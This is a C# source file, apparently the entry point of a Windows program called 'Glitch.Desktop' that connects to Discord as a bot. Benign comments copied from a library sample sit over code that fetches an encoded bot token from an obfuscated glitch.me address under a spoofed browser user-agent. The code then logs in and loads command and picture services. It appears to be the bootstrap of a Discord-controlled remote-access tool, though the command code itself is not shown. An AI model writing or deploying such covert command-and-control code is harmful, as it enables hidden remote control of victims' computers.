using System;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;
using System.Drawing;
using System.Windows.Forms;
using ImageFormat = System.Drawing.Imaging.ImageFormat;
using System.IO;
using Discord.Commands;
using Glitch.Desktop.Services;
using Microsoft.Extensions.DependencyInjection;
using System.Net.Http;
using System.Linq;
using System.Text;
using Newtonsoft.Json;
using System.Net;

namespace Glitch.Desktop
{
    class Program
    {
        static void Main()
        {
            new Discord().MainAsync().GetAwaiter().GetResult();
        }
    }
    class Discord
    {
        string id = generate_Digits();
        // There is no need to implement IDisposable like before as we are
        // using dependency injection, which handles calling Dispose for us.

        public async Task MainAsync()
        {
            // You should dispose a service provider created using ASP.NET
            // when you are finished using it, at the end of your app's lifetime.
            // If you use another dependency injection framework, you should inspect
            // its documentation for the best way to do this.
            using (var services = ConfigureServices())
            {
                using (var webClient = new WebClient())
                {
                    var client = services.GetRequiredService<DiscordSocketClient>();

                    client.Log += LogAsync;
                    services.GetRequiredService<CommandService>().Log += LogAsync;

                    // Tokens should be considered secret data and never hard-coded.
                    // We can read from the environment variable to avoid hardcoding.
                    webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; " +
                                  "Windows NT 5.2; .NET CLR 1.0.3705;)");
                    dynamic json = JsonConvert.DeserializeObject(webClient.DownloadString("https://chjlaw5zdgfsbdf0amf0ag--.glitch.me/cHJlaW5zdGFsbDF0amF0ag==.json"));
                    string token = json.token;
                    byte[] data2 = Convert.FromBase64String(token);
                    string decodedToken = Encoding.UTF8.GetString(data2);

                    await client.LoginAsync(TokenType.Bot, decodedToken);
                    await client.StartAsync();

                    // Here we initialize the logic required to register our commands.
                    await services.GetRequiredService<CommandHandlingService>().InitializeAsync();

                    await Task.Delay(Timeout.Infinite);
                }
            }
        }
        public static string generate_Digits()
        {
            var rndDigits = new StringBuilder().Insert(0, "0123456789", 1).ToString();
            return string.Join("", rndDigits.OrderBy(o => Guid.NewGuid()).Take(1));
        }
        private Task LogAsync(LogMessage log)
        {
            Console.WriteLine(log.ToString());

            return Task.CompletedTask;
        }

        private ServiceProvider ConfigureServices()
        {
            return new ServiceCollection()
                .AddSingleton<DiscordSocketClient>()
                .AddSingleton<CommandService>()
                .AddSingleton<CommandHandlingService>()
                .AddSingleton<HttpClient>()
                .AddSingleton<PictureService>()
                .BuildServiceProvider();
        }

        // This is not the recommended way to write a bot - consider
        // reading over the Commands Framework sample. 
        public static void Start()
        {

            new Discord().MainAsync().GetAwaiter().GetResult();
        }
    }
}
